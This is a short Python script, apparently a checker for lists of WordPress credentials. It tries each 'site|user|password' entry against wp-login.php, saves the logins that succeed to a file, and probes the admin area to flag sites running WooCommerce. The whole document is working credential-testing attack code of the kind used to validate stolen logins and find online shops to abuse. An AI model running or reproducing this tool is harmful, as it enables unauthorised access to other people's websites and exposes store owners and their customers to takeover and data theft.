import requests
import requests,re,colorama
colorama.init(autoreset=True)
rd, gn, lgn, yw, lrd, be, pe = '\033[00;31m', '\033[00;32m', '\033[01;32m', '\033[01;33m', '\033[01;31m', '\033[00;34m', '\033[01;35m'
cn = '\033[00;36m'
white = "\033[97m"
def checkwo(url):
    try:
        go = requests.session()
        site, user, passwd = url.split("|")
        get = go.get(site, timeout=10)
        submit = re.findall(
            '<input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="(.*)" />',
            get.content)
        submit = submit[0]
        redirect = re.findall('<input type="hidden" name="redirect_to" value="(.*?)" />', get.content)
        redirect = redirect[0]
        Login = {'log': user,
                 'pwd': passwd,
                 'wp-submit': submit,
                 'redirect_to': redirect,
                 'testcookie': '1'}
        req = go.post(site, data=Login, timeout=20)
        currurl = site.replace("/wp-login.php", "")
        if 'dashboard' in req.content:
          print('Login Success! checking WooCommerce plugins...' + site)
          with open('loginsuccess.txt', 'a') as writer:
            writer.write("http://"+site+"/wp-login.php|"+user+"|"+passwd+"\n")
          ngecek = currurl + "/wp-admin/admin.php?page=wc-admin"
          getdata = go.get(ngecek, timeout=20, allow_redirects=False).content
          if 'WooCommerce' in getdata:
            print(f"{lrd}[{lgn}+{lrd}] {lgn}{currurl}>> {gn}WooCommerce installed")
            open('WooCommerce.txt', 'a').write(currurl + '/wp-login.php|'+user+'|'+passwd+'\n')
          else:print(f"{lrd}[{lgn}!{lrd}] {lgn}{currurl} {rd}>> {lrd}WooCommerce not found")
        else:print(f"{lrd}[{lgn}!{lrd}] {lgn}{currurl} ==> {lrd}Login failed")
    except:pass
lists = input(f'{lrd}[{lgn}?{lrd}] {lgn}Enter Your Logins : {cn}')
with open(lists) as f:
  for url in f:
    checkwo(url)